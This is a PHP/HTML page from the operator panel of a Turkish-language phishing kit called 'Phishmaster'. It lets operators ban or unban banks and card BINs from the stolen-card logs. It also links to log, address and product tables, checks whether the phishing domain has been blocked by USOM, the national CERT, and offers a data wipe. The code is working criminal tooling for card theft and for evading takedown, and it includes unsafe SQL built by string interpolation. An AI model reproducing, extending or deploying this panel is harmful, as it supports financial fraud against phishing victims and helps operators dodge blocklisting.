<?php include_once(__DIR__ . "/../config.php"); include_once(__DIR__ . "/Data/Server/GrabIP.php"); include_once(__DIR__ . "/function/MainFunction.php"); include_once(__DIR__ . "/Data/Client/GetBank.php"); giris_dogrulama($pdo);
  
  $QueryServer = $pdo->query("SELECT * FROM admin_settings")->fetch(PDO::FETCH_ASSOC);
  $QueryAdmin = $pdo->query("SELECT * FROM admin WHERE ip_adresi = '{$ip}'")->fetch(PDO::FETCH_ASSOC);

  
  if($QueryServer["ip_filter"] == 1) {
    if(!in_array($ip, $ip_filter_config)) {
      die("IP Firewall - monke");
    }
  }

  if($_POST) {
    if($_POST['banka-ban-kaldir']) {
      if(!empty($_POST['banka-ban-kaldir']) and isset($_SESSION['giris_yapildi'])) {
        $stmt = $pdo->prepare('DELETE FROM yasakli_binler WHERE banka = ?');
        $stmt->execute([ $_POST['banka-ban-kaldir']]);
        $stmt2 = $pdo->prepare('INSERT INTO action_history SET kullanici_adi = ?, yetki = ?, ip_adresi = ?, son_islem = ?');
        $stmt2->execute([ $QueryAdmin['kullanici_adi'], $QueryAdmin['yetki'], $QueryAdmin['ip_adresi'], $QueryAdmin['kullanici_adi'].', isimli kullanıcı '.$_POST['banka-ban-kaldir'].' isimli bankanın yasaklanmasını kaldırdı!' ]);
        header('Location: banks');
        exit;
      }
    } else if($_POST['banka-banla']) {
      if(!empty($_POST['banka-banla']) and isset($_SESSION['giris_yapildi'])) {

        $stmt1 = $pdo->prepare('INSERT INTO yasakli_binler SET banka = ?');
        $stmt1->execute([ $_POST['banka-banla'] ]);
      
        if(is_numeric($_POST['banka-banla'])) {
          $stmt2 = $pdo->prepare('INSERT INTO action_history SET kullanici_adi = ?, yetki = ?, ip_adresi = ?, son_islem = ?');
          $stmt2->execute([ $QueryAdmin['kullanici_adi'], $QueryAdmin['yetki'], $QueryAdmin['ip_adresi'], $QueryAdmin['kullanici_adi'].', isimli kullanıcı '.$_POST['banka-banla'].' binini yasakladı!' ]);
        } else {
          $stmt2 = $pdo->prepare('INSERT INTO action_history SET kullanici_adi = ?, yetki = ?, ip_adresi = ?, son_islem = ?');
          $stmt2->execute([ $QueryAdmin['kullanici_adi'], $QueryAdmin['yetki'], $QueryAdmin['ip_adresi'], $QueryAdmin['kullanici_adi'].', isimli kullanıcı '.$_POST['banka-banla'].' isimli bankayı yasakladı!' ]);
        }
        
        header('Location: banks');
        exit;
      }
    }
  }
?>
<!doctype html>
<html lang="tr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>monke - Banka Tablosu</title>
    <meta name="description" content="monke Panel">
    <meta name="author" content="monke">
    <meta name="robots" content="noindex, nofollow">
    
    <meta property="og:title" content="monke Panel">
    <meta property="og:site_name" content="Developed monke">
    <meta property="og:description" content="monke Panel">
    <meta property="og:type" content="website">

    <link rel="shortcut icon" href="assets/media/favicons/favicon.png">
    <link rel="icon" type="image/png" sizes="192x192" href="assets/media/favicons/favicon-192x192.png">
    <link rel="apple-touch-icon" sizes="180x180" href="assets/media/favicons/apple-touch-icon-180x180.png">
    <link rel="stylesheet" id="css-main" href="assets/css/oneui.min.css">
    <link rel="stylesheet" href="assets/js/plugins/datatables-bs5/css/dataTables.bootstrap5.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

    <script>
      $(document).ready(function() {
        setInterval(function() {
          $("#tablo").load(window.location.href + " #tablo");
        }, 3000);
      });
    </script>
  </head>
  <body>
    <div id="page-container" class="sidebar-o sidebar-light enable-page-overlay side-scroll page-header-fixed remember-theme">
      <nav id="sidebar" aria-label="Main Navigation">
        <div class="content-header">
          <a class="fw-semibold text-dual" href="main">
            <span class="smini-visible">
              <i class="fa-solid fa-crosshairs text-primary"></i>
            </span>
            <span class="smini-hide fs-5 tracking-wider">Phish<span class="fw-normal">master</span></span>
          </a>
          <div>
            <button type="button" class="btn btn-sm btn-alt-secondary" data-toggle="layout" data-action="dark_mode_toggle">
              <i class="fa fa-moon"></i>
            </button>
            <div class="dropdown d-inline-block ms-1">
              <button type="button" class="btn btn-sm btn-alt-secondary" id="sidebar-themes-dropdown" data-bs-toggle="dropdown" data-bs-auto-close="outside" aria-haspopup="true" aria-expanded="false">
                <i class="fa fa-brush"></i>
              </button>
              <div class="dropdown-menu dropdown-menu-end fs-sm smini-hide border-0" aria-labelledby="sidebar-themes-dropdown">
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="default">
                  <span>Varsayılan</span>
                  <i class="fa fa-circle text-default"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/amethyst.min.css">
                  <span>Stil 1</span>
                  <i class="fa fa-circle text-amethyst"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/city.min.css">
                  <span>Stil 2</span>
                  <i class="fa fa-circle text-city"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/flat.min.css">
                  <span>Stil 3</span>
                  <i class="fa fa-circle text-flat"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/modern.min.css">
                  <span>Stil 4</span>
                  <i class="fa fa-circle text-modern"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/smooth.min.css">
                  <span>Stil 5</span>
                  <i class="fa fa-circle text-smooth"></i>
                </button>
              </div>
            </div>
            <a class="d-lg-none btn btn-sm btn-alt-secondary ms-1" data-toggle="layout" data-action="sidebar_close" href="javascript:void(0)">
              <i class="fa fa-fw fa-times"></i>
            </a>
          </div>
        </div>
        <div class="js-sidebar-scroll">
          <div class="content-side">
            <ul class="nav-main">
              <li class="nav-main-item">
                <a class="nav-main-link" href="main">
                  <i class="nav-main-link-icon si si-speedometer"></i>
                  <span class="nav-main-link-name">Anasayfa</span>
                </a>
              </li>
              <li class="nav-main-heading">PHISHING</li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="logs">
                  <i class="nav-main-link-icon si si-credit-card"></i>
                  <span class="nav-main-link-name">Log Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="bans">
                  <i class="nav-main-link-icon si si-ban"></i>
                  <span class="nav-main-link-name">Ban Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link active" href="banks">
                  <i class="nav-main-link-icon fa fa-bank"></i>
                  <span class="nav-main-link-name">Banka Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="urunler">
                  <i class="nav-main-link-icon fa fa-cart-shopping"></i>
                  <span class="nav-main-link-name">Ürün Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="address">
                  <i class="nav-main-link-icon fa fa-map"></i>
                  <span class="nav-main-link-name">Adres Tablosu</span>
                </a>
              </li>
              <li class="nav-main-heading">ARACLAR</li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="javascript:void(0);" id="check_usom">
                  <i class="nav-main-link-icon fa fa-check-double"></i>
                  <span class="nav-main-link-name">USOM Kontrolü</span>
                </a>
              </li>
              <?php if($QueryAdmin['yetki'] == "Superadmin"): ?>
              <li class="nav-main-heading">YONETIM</li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="user">
                  <i class="nav-main-link-icon si si-people"></i>
                  <span class="nav-main-link-name">Kullanıcı Yönetimi</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="action_history">
                  <i class="nav-main-link-icon si si-list"></i>
                  <span class="nav-main-link-name">İşlem Geçmişi</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="javascript:void(0);" id="factory_reset">
                  <i class="nav-main-link-icon fa-solid fa-wrench"></i>
                  <span class="nav-main-link-name">Fabrika Ayarları</span>
                </a>
              </li>
              <?php endif; ?>
            </ul>
          </div>
        </div>
      </nav>
      <header id="page-header">
        <div class="content-header">
          <div class="d-flex align-items-center">
            <button type="button" class="btn btn-sm btn-alt-secondary me-2 d-lg-none" data-toggle="layout" data-action="sidebar_toggle">
              <i class="fa fa-fw fa-bars"></i>
            </button>
            <button type="button" class="btn btn-sm btn-alt-secondary me-2 d-none d-lg-inline-block" data-toggle="layout" data-action="sidebar_mini_toggle">
              <i class="fa fa-fw fa-ellipsis-v"></i>
            </button>
          </div>
          <div class="d-flex align-items-center">
            <div class="dropdown d-inline-block ms-2">
              <button type="button" class="btn btn-sm btn-alt-secondary d-flex align-items-center" id="page-header-user-dropdown" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <img class="rounded-circle" src="assets/media/avatars/avatar0.jpg" style="width: 21px;">
                <span class="d-none d-sm-inline-block ms-2"><?php echo $QueryAdmin['kullanici_adi']; ?></span>
                <i class="fa fa-fw fa-angle-down d-none d-sm-inline-block opacity-50 ms-1 mt-1"></i>
              </button>
              <div class="dropdown-menu dropdown-menu-md dropdown-menu-end p-0 border-0" aria-labelledby="page-header-user-dropdown">
                <div class="p-3 text-center bg-body-light border-bottom rounded-top">
                  <p class="mt-2 mb-0 fw-medium"><?php echo $QueryAdmin['kullanici_adi']; ?></p>
                  <p class="mb-0 text-muted fs-sm fw-medium"><?php echo $QueryAdmin['yetki']; ?></p>
                </div>
                <div class="p-2">
                  <a class="dropdown-item d-flex align-items-center justify-content-between" href="settings">
                    <span class="fs-sm fw-medium">Ayarlar</span>
                  </a>
                  <a class="dropdown-item d-flex align-items-center justify-content-between" href="quit">
                    <span class="fs-sm fw-medium">Çıkış Yap</span>
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </header>
      <main id="main-container">
        <div class="bg-body-light">
          <div class="content content-full">
            <div class="d-flex flex-column flex-sm-row justify-content-sm-between align-items-sm-center py-2">
              <div class="flex-grow-1">
                <h1 class="h3 fw-bold mb-2"> Banka Tablosu </h1>
                <h2 class="fs-base lh-base fw-medium text-muted mb-0">
                    <?php echo $mesaj; ?> <a class="link-fx" href="javascript:void(0)"><?php echo $QueryAdmin['kullanici_adi']; ?></a>, bu sayfa sayesinde phishingteki bankaları kontrol edebilirsin.
                </h2>
              </div>
              <nav class="flex-shrink-0 mt-3 mt-sm-0 ms-sm-3" aria-label="breadcrumb">
                <ol class="breadcrumb breadcrumb-alt">
                  <li class="breadcrumb-item">
                    <a class="link-fx" href="javascript:void(0)">Phishing</a>
                  </li>
                  <li class="breadcrumb-item" aria-current="page"> Banka Tablosu </li>
                </ol>
              </nav>
            </div>
          </div>
        </div>
        <div class="content">
          <div class="col-12">
            <div class="block block-rounded row g-0">
              <ul class="nav nav-tabs nav-tabs-block flex-md-column col-md-4 col-xxl-2" role="tablist">
                <li class="nav-item d-md-flex flex-md-column">
                  <button class="nav-link text-md-start active" id="banka-ban-kaldir-buton" data-bs-toggle="tab" data-bs-target="#banka-ban-kaldir" role="tab" aria-controls="banka-ban-kaldir" aria-selected="true">
                    <i class="fa fa-fw fa-user-plus opacity-50 me-1 d-none d-sm-inline-block"></i>
                    <span>Banka Banı Kaldır</span>
                    <span class="d-none d-md-block fs-xs fw-medium opacity-75 mt-md-2">
                      Panelde banlı olan bankanın banını kaldırır.
                    </span>
                  </button>
                </li>
                <li class="nav-item d-md-flex flex-md-column">
                  <button class="nav-link text-md-start" id="banka-banla-buton" data-bs-toggle="tab" data-bs-target="#banka-banla" role="tab" aria-controls="banka-banla" aria-selected="false">
                    <i class="fa fa-fw fa-user-minus opacity-50 me-1 d-none d-sm-inline-block"></i>
                    <span>Banka Banla</span>
                    <span class="d-none d-md-block fs-xs fw-medium opacity-75 mt-md-2">
                      Paneldeki bankaların loguna gelmemesini sağlayabilirsin.
                    </span>
                  </button>
                </li>
                <li class="nav-item d-md-flex flex-md-column">
                  <button class="nav-link text-md-start" id="banka-tablosu-buton" data-bs-toggle="tab" data-bs-target="#banka-tablosu" role="tab" aria-controls="banka-tablosu" aria-selected="false">
                    <i class="fa fa-fw fa-table opacity-50 me-1 d-none d-sm-inline-block"></i>
                    <span>Banka Tablosu</span>
                    <span class="d-none d-md-block fs-xs fw-medium opacity-75 mt-md-2">
                      Panelde mevcut olan bankaları listeleyebilirsin.
                    </span>
                  </button>
                </li>
              </ul>
              <div class="tab-content col-md-8 col-xxl-10">
                <div class="block-content tab-pane active" id="banka-ban-kaldir" role="tabpanel" aria-labelledby="banka-ban-kaldir-buton" tabindex="0">
                  <h4 class="fw-semibold">Banka Banı Kaldır</h4>
                  <form method="POST" class="banka-ban-kaldir">
                    <div class="mb-4 col-md-4">
                      <label class="form-label" for="banka-ban-kaldir">Banka Adı</label>
                      <input type="text" class="form-control" id="banka-ban-kaldir" name="banka-ban-kaldir" placeholder="Banka Adı">
                    </div>
                    <div class="mb-3">
                      <button type="submit" class="btn btn-sm btn-success">
                        <i class="fa fa-fw fa-plus me-1"></i> Banka Banı Kaldır
                      </button>
                    </div>
                  </form>
                </div>
                <div class="block-content tab-pane" id="banka-banla" role="tabpanel" aria-labelledby="banka-banla-buton" tabindex="0">
                  <h4 class="fw-semibold">Banka Banla</h4>
                  <form method="POST" class="banka-banla">
                    <div class="mb-4 col-md-4">
                      <label class="form-label" for="banka-banla">Banka Adı</label>
                      <input type="text" class="form-control" id="banka-banla" name="banka-banla" placeholder="Banka Adı">
                    </div>
                    <div class="mb-3">
                      <button type="submit" class="btn btn-sm btn-danger">
                        <i class="fa fa-fw fa-times me-1"></i> Banka Banla
                      </button>
                    </div>
                  </form>
                </div>
                <div class="block-content tab-pane" id="banka-tablosu" role="tabpanel" aria-labelledby="banka-tablosu-buton" tabindex="0">
                  <h4 class="fw-semibold">Banka Tablosu</h4>
                    <div class="block-content block-content-full">
                     <table class="table table-bordered table-striped table-vcenter js-dataTable-responsive">
                        <thead>
                           <tr>
                              <th class="text-center fw-light fs-sm" style="width: 300px;"><i class="fa-solid fa-building-columns"></i> Banka Logosu</th>
                              <th class="text-center fw-light fs-sm" style="width: 300px;"><i class="fa-solid fa-building-columns"></i> Banka Adı</th>
                              <th class="text-center fw-light fs-sm" style="width: 300px;"><i class="fa-solid fa-signal"></i> Durum</th>
                           </tr>
                        </thead>
                        <tbody>
                        <?php foreach($banka as $banka_adi => $banka_logo){ ?>
                          <?php $yasakli_bin = $pdo->query("SELECT * FROM yasakli_binler WHERE banka LIKE '%".$banka_adi."%'")->fetch(PDO::FETCH_ASSOC); ?>
                          <tr>
                            <td class="text-center fw-normal fs-sm"><img src="<?php echo $banka_logo ?>" alt="<?php echo $banka_adi ?>"></td>
                            <td class="text-center fw-normal fs-sm"><a href="javascript:void(0)" class="Kopyala" data-clipboard-text="<?php echo htmlspecialchars($banka_adi); ?>"><?php echo htmlspecialchars($banka_adi); ?></a></td>  
                            <td class="text-center fw-normal fs-sm"><?php if($yasakli_bin){ echo "<span style='background transparent; color: #FF0000; text-shadow: 0px 0px 10px;'><i class='fa-solid fa-ban'></i> Yasaklandı</span>"; } else { echo "<span style='background transparent; color: lightgreen; text-shadow: 0px 0px 10px;'><i class='fa-solid fa-check'></i> Yasaklı Değil</span>"; } ?></td>
                          </tr>
                        <?php } ?>
                        </tbody>
                     </table>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      <footer id="page-footer" class="bg-body-light">
        <div class="content py-3">
          <div class="row fs-sm">
            <div class="col-sm-6 order-sm-2 py-1 text-center text-sm-end"> Kullanıcı: <a class="fw-semibold link-fx" href="javascript:void(0)"><?php echo $QueryAdmin['kullanici_adi']; ?></a>
            </div>
            <div class="col-sm-6 order-sm-1 py-1 text-center text-sm-start">
              <a class="fw-semibold link-fx" href="javascript:void(0)">monke</a> &copy; <span data-toggle="year-copy"></span>
            </div>
          </div>
        </div>
      </footer>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
    <script type="text/javascript">
      var title = document.title;
      var alttitle = "Vurgun için bekleniyorsun ;)";
      window.onblur = function () { 
        document.title = alttitle;
      };
      window.onfocus = function () { 
        document.title = title;
      };

      document.getElementById("check_usom").addEventListener("click", function(e) {
        var domain = window.location.host; 

        One.helpers('jq-notify', {type: 'warning', icon: 'fa fa-rotate me-1', message: 'USOM kontrolü yapılıyor!'});

        e.preventDefault();
        
        $.ajax({
          type: "POST",
          url: "./function/CheckUsom.php",
          data: {
            domain: domain
          },
          success: function (data) {
            if(data === "yasaklandi") {
              One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-times me-1', message: "Domain USOM tarafından yasaklanmış durumda."});
            } else if(data === "yasaklanmadi") {
              One.helpers('jq-notify', {type: 'success', icon: 'fa fa-check me-1', message: "Domain USOM tarafından yasaklanmadı."});
            } else if(data === "baglanti hatasi") {
              One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-check me-1', message: "USOM ile bağlantı kurulamadı!"});
            }
          }
        });
      });

      var clipboard = new ClipboardJS('.Kopyala');
      clipboard.on('success', function (e) {
        One.helpers('jq-notify', {type: 'success', icon: 'fa fa-check me-1', message: 'Panoya kopyalama işlemi başarılı!'});
      });
      clipboard.on('error', function (e) {
        One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-times me-1', message: 'Panoya kopyalama işlemi başarısız!'});
      });
      
      document.getElementById("factory_reset").addEventListener("click", function(e) {
        Swal.fire({
          title: 'Emin misin?',
          text: "Bu işlemi geri alamıyacaksın ve bütün veriler silinecektir!",
          icon: 'warning',
          showCancelButton: true,
          confirmButtonColor: '#3085d6',
          cancelButtonColor: '#d33',
          confirmButtonText: 'Evet',
          cancelButtonText: 'Hayır'
        }).then((result) => {
          if (result.isConfirmed) {
            e.preventDefault();
            $.ajax({
              type: "POST",
              url: "./function/FactoryReset.php",
              data: {
                izin: true
              },
              success: function (data) {
                Swal.fire({
                  title: 'İşlem Başarılı!',
                  text: "Bütün veriler başarıyla silindi.",
                  icon: 'success',
                  confirmButtonColor: '#3085d6',
                  confirmButtonText: 'Tamam'
                }).then((result) => {
                  if (result.isConfirmed) {
                    window.location.href = 'quit';
                  }
                })
              }
            });
          }
        })
      });
    </script>
    <script src="assets/js/oneui.app.min.js"></script>
    <script src="assets/js/lib/jquery.min.js"></script>
    <script src="assets/js/plugins/jquery-validation/jquery.validate.min.js"></script>
    <script src="assets/js/pages/banka-banla.min.js"></script>
    <script src="assets/js/pages/banka-ban-kaldir.min.js"></script>
    <script src="assets/js/plugins/bootstrap-notify/bootstrap-notify.min.js"></script>
    <script src="assets/js/plugins/datatables/jquery.dataTables.min.js"></script>
    <script src="assets/js/plugins/datatables-bs5/js/dataTables.bootstrap5.min.js"></script>
    <script src="assets/js/plugins/datatables-buttons/dataTables.buttons.min.js"></script>
    <script src="assets/js/pages/datatable.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>One.helpersOnLoad(['jq-notify']);</script>
  </body>
</html>